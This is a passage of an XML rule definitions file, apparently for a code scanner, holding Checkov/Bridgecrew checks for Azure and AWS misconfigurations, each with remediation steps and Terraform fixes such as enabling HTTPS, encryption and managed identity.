<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
             ...
  +           logs {
  +             failed_request_tracing_enabled = true
                }
             ...
              }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-app-service-enables-failed-request-tracing' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-app-service-enables-failed-request-tracing</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-app-service-enables-failed-request-tracing' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_67</key>
    <name>Ensure function app uses the latest HTTP version</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-function-app-does-not-use-http-20"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-function-app-does-not-use-http-2-0"></div>Azure function app does not use HTTP 2.0</div><a aria-label="Skip link to Azure function app does not use HTTP 2.0" class="heading-anchor-icon fa fa-anchor" href="#azure-function-app-does-not-use-http-20"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Azure Function App which doesn't use HTTP 2.0. HTTP 2.0 has additional performance improvements on the head-of-line blocking problem of old HTTP version, header compression, and prioritisation of requests. HTTP 2.0 no longer supports HTTP 1.1's chunked transfer encoding mechanism, as it provides its own, more efficient, mechanisms for data streaming.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-console"></div>In Azure Console</div><a aria-label="Skip link to In Azure Console" class="heading-anchor-icon fa fa-anchor" href="#in-azure-console"></a></h2>
<ol>
<li>Log in to the Azure portal</li>
<li>Navigate to Function App</li>
<li>Click on the reported Function App</li>
<li>Under Setting section, Click on 'Configuration'</li>
<li>Under 'General Settings' tab, In 'Platform settings', Set 'HTTP version' to '2.0'</li>
<li>Click on 'Save'. </li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-cli"></div>In Azure CLI</div><a aria-label="Skip link to In Azure CLI" class="heading-anchor-icon fa fa-anchor" href="#in-azure-cli"></a></h2>
<p>If Function App Hosted in Linux using Consumption (Serverless) Plan follow below steps Azure CLI Command</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">- az functionapp config set --http20-enable true --name MyFunctionApp --resource-group MyResourceGroup
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_function_app</li>
<li><strong>Argument:</strong> site_config.http2_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_function_app" "example" {
           ...
+          site_config {
+          http2_enabled = true
          }
        }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-http-version-is-the-latest-if-used-to-run-the-function-app' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-http-version-is-the-latest-if-used-to-run-the-function-app</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-http-version-is-the-latest-if-used-to-run-the-function-app' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_70</key>
    <name>Ensure S3 bucket does not allow an action with any Principal</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-bucket-allows-an-action-with-any-principal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-bucket-allows-an-action-with-any-principal"></div>S3 bucket allows an action with any Principal</div><a aria-label="Skip link to S3 bucket allows an action with any Principal" class="heading-anchor-icon fa fa-anchor" href="#s3-bucket-allows-an-action-with-any-principal"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Principal element specifies the user, account, service, or other entity that is allowed or denied access to a resource. In Amazon S3, a Principal is the account or user who is allowed access to the actions and resources in the statement. When added to a bucket policy, the principal is the user, account, service, or other entity that is the recipient of this permission. </p>
<p>When you set the wildcard ("*") as the Principal value you essentially grant permission to everyone. This is referred to as anonymous access. The following statements are all considered Anonymous Permissions.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">## Example 1
"Principal":"*"

## Example 2
"Principal":{"AWS":"*"}

## Example 2
"Principal":{"AWS":["*", ...]}
</code></pre></div></div>
<p>When you grant anonymous access, anyone in the world can access your bucket. It is highly recommend to <strong>never</strong> grant any kind of anonymous write access to your S3 bucket.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>. </li>
<li>Open the <a href="https://console.aws.amazon.com/s3/" target="_self">Amazon S3 console</a>.</li>
<li>Select the <strong>Permissions</strong> tab, then select <strong>Bucket Policy</strong>. </li>
<li>Remove policies for s3:List<em> actions for principals '</em>'. If necessary, modify the policy instead, to limit the access to specific principals.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_s3_bucket" "bucket" {
  bucket = "bucket"

  policy = &lt;&lt;POLICY
{
    "Id": "Policy1597273448050",
    "Version": "2012-10-17",
    "Statement": [
        {
            "Action": [
                "s3:GetObject"
            ],
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::bucket/*",
-           "Principal": "*"
        },
     ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_s3_23' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_s3_23</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_s3_23' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_70</key>
    <name>Ensure function apps are only accessible over HTTPS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="function-apps-are-not-only-accessible-over-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-function-apps-are-not-only-accessible-over-https"></div>Function apps are not only accessible over HTTPS</div><a aria-label="Skip link to Function apps are not only accessible over HTTPS" class="heading-anchor-icon fa fa-anchor" href="#function-apps-are-not-only-accessible-over-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong>https_only </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
                            ...
 +            https_only          = true
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-function-apps-is-only-accessible-over-https' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-function-apps-is-only-accessible-over-https</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-function-apps-is-only-accessible-over-https' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_71</key>
    <name>Ensure managed identity provider is enabled for app services</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-service-web-app-does-not-have-a-managed-service-identity"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-service-web-app-does-not-have-a-managed-service-identity"></div>Azure App Service Web app does not have a Managed Service Identity</div><a aria-label="Skip link to Azure App Service Web app does not have a Managed Service Identity" class="heading-anchor-icon fa fa-anchor" href="#azure-app-service-web-app-does-not-have-a-managed-service-identity"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Managed service identity in App Service makes the app more secure by eliminating secrets from the app, such as credentials in the connection strings. When registering with Azure Active Directory in the app service, the app will connect to other Azure services securely without the need of username and passwords.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-console"></div>In Azure Console</div><a aria-label="Skip link to In Azure Console" class="heading-anchor-icon fa fa-anchor" href="#in-azure-console"></a></h2>
<ol>
<li>Log in to the Azure portal.</li>
<li>Navigate to App Services.</li>
<li>Click on the reported App.</li>
<li>Under Setting section, Click on 'Identity'.</li>
<li>Ensure that 'Status' is set to 'On'.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime-1"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> identity.type</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
              ...
  +           identity {
  +             type = "SystemAssigned"
                }
              }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-managed-identity-provider-is-enabled-for-app-services' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-managed-identity-provider-is-enabled-for-app-services</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-managed-identity-provider-is-enabled-for-app-services' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_72</key>
    <name>Ensure remote debugging is not enabled for app services</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="remote-debugging-is-enabled-for-app-services"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-remote-debugging-is-enabled-for-app-services"></div>Remote debugging is enabled for app services</div><a aria-label="Skip link to Remote debugging is enabled for app services" class="heading-anchor-icon fa fa-anchor" href="#remote-debugging-is-enabled-for-app-services"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> remote_debugging_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
                   ...
+                  remote_debugging_enabled = false
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-remote-debugging-is-not-enabled-for-app-services' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-remote-debugging-is-not-enabled-for-app-services</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-remote-debugging-is-not-enabled-for-app-services' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_73</key>
    <name>Ensure Automation account variables are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-automation-account-variables-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-automation-account-variables-are-not-encrypted"></div>Azure Automation account variables are not encrypted</div><a aria-label="Skip link to Azure Automation account variables are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#azure-automation-account-variables-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>If you have Automation Account Variables storing sensitive data that are not already encrypted, then you will need to delete them and recreate them as encrypted variables. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-cli"></div>In Azure CLI</div><a aria-label="Skip link to In Azure CLI" class="heading-anchor-icon fa fa-anchor" href="#in-azure-cli"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">Set-AzAutomationVariable -AutomationAccountName '{AutomationAccountName}' -Encrypted $true -Name '{VariableName}' -ResourceGroupName '{ResourceGroupName}' -Value '{Value}'
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_automation_variable_int</li>
<li><strong>Argument:</strong> encrypted</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_automation_variable_int" "example" {
  ...
+ encrypted               = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-automation-account-variables-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-automation-account-variables-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-automation-account-variables-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_74</key>
    <name>Ensure Azure Data Explorer uses disk encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-data-explorer-does-not-use-disk-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-data-explorer-does-not-use-disk-encryption"></div>Azure Data Explorer does not use disk encryption</div><a aria-label="Skip link to Azure Data Explorer does not use disk encryption" class="heading-anchor-icon fa fa-anchor" href="#azure-data-explorer-does-not-use-disk-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling encryption at rest using a customer-managed key on your Azure Data Explorer cluster provides additional control over the key being used by the encryption at rest. This feature is oftentimes applicable to customers with special compliance requirements and requires a Key Vault to managing the keys.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_kusto_cluster</li>
<li><strong>Argument:</strong> enable_disk_encryption</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_kusto_cluster" "example" {
    ...
  + enable_disk_encryption = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-uses-disk-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-uses-disk-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-uses-disk-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_76</key>
    <name>Ensure Azure Batch account uses key vault to encrypt data</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-batch-account-does-not-use-key-vault-to-encrypt-data"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-batch-account-does-not-use-key-vault-to-encrypt-data"></div>Azure Batch account does not use key vault to encrypt data</div><a aria-label="Skip link to Azure Batch account does not use key vault to encrypt data" class="heading-anchor-icon fa fa-anchor" href="#azure-batch-account-does-not-use-key-vault-to-encrypt-data"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use customer-managed keys to manage the encryption at rest of your Batch account's data. By default, customer data is encrypted with service-managed keys, but customer-managed keys are commonly required to meet regulatory compliance standards. Customer-managed keys enable the data to be encrypted with an Azure Key Vault key created and owned by you. You have full control and responsibility for the key lifecycle, including rotation and management.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_batch_account</li>
<li><strong>Argument:</strong> key_vault_reference</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_batch_account" "example" {
                            ...
+             key_vault_reference {
                id = "test"
                url = "https://test.com"
              }
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-batch-account-uses-key-vault-to-encrypt-data' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-batch-account-uses-key-vault-to-encrypt-data</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-batch-account-uses-key-vault-to-encrypt-data' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_60</key>
    <name>Ensure storage accounts have secure transfer enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="storage-accounts-without-secure-transfer-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-storage-accounts-without-secure-transfer-enabled"></div>Storage accounts without secure transfer enabled</div><a aria-label="Skip link to Storage accounts without secure transfer enabled" class="heading-anchor-icon fa fa-anchor" href="#storage-accounts-without-secure-transfer-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The secure transfer option enhances the security of a storage account by only allowing requests to the storage account by a secure connection. For example, when calling REST APIs to access storage accounts, the connection must use HTTPS. Any requests using HTTP will be rejected when 'secure transfer required' is enabled. When using the Azure files service, connection without encryption will fail, including scenarios using SMB 2.1, SMB 3.0 without encryption, and some flavors of the Linux SMB client. Because Azure storage doesn&#8217;t support HTTPS for custom domain names, this option is not applied when using a custom domain name.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_storage_account</li>
<li><strong>Argument:</strong>  enable_https_traffic_only</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_account" "example" {
              ...
           +  enable_https_traffic_only = true
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-storage-account-enables-secure-transfer' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-storage-account-enables-secure-transfer</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-storage-account-enables-secure-transfer' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_77</key>
